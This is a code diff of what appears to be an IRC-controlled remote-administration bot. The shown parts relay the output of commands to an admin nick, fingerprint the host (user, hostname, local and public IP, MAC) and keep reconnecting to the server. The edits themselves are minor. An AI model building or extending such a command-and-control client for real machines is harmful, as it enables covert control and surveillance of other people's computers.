@@ -147,7 +147,7 @@ def privmsg(msg=None, to=admin):                                                
         total = len(msgs)
         for num, line in enumerate(msgs):
             signal.signal(signal.SIGALRM, timeout_handler)
-            signal.alarm(1)                                                     # doubles as flood prevention and input checking
+            signal.alarm(1)                                                     # doubles as flood prevention wait and input checking
             try:
                 data = irc.recv(4096)
             except:
@@ -161,7 +161,7 @@ def privmsg(msg=None, to=admin):                                                
                 privmsg("[X]: %s" % retcode, to)
                 break
             log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
-            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))  # [1/10] Output line 1 out of 10 total
+            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))  # [1/10] = Output line 1 out of 10 total
         log('[#] Finished multiline output.')     
     else:
         log('[+] Sent Data:')
@@ -244,7 +244,7 @@ def identify():                                                                 
     log('[>]    Public:  ',public_ip)
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
-    return "[v%s/x%s] %s@%s u: %s l: %s p: %s MAC: %s" % (version, system.strip(), local_user, hostname, main_user, local_ip, public_ip, mac_addr)
+    return "[v%s/x%s] %s@%s l: %s p: %s MAC: %s" % (version, system.strip(), main_user, hostname, local_ip, public_ip, mac_addr)
  
 def full_identify():                                                            # give verbose identifying info about the host computer
     log('[+] Running v%s Identification Modules...' % version)
@@ -482,7 +482,6 @@ if __name__ == '__main__':
     last_ping = time.time()                                                     # last ping recieved
     threshold = 8 * 60                                                          # maximum time between pings before assuming disconnected (in seconds)
     quit_status = False
-    connection_time = -1
 
     while not quit_status:
         signal.signal(signal.SIGTERM, sigterm_handler)
@@ -513,14 +512,14 @@ if __name__ == '__main__':
                 log('[*] Connection Failed: ')
                 log('[X]    ',error)
                 timeout_count = 50
-                sleep(10)
+                sleep(20)
 
             while not quit_status and (timeout_count < 50):                     # if timeout_count is above 50, reconnect  
                 try:
                     data = irc.recv(4096)
                     log('[+] Recieved:')
                     log('[>]    ', data.strip())
-                    if (last_data == data):                                         # IRC servers  will occasionally send lots of blank messages instead of disconnecting
+                    if (last_data == data):                                     # IRC servers  will occasionally send lots of blank messages instead of disconnecting
                         timeout_count += 1       
                     else:
                         timeout_count = 0  
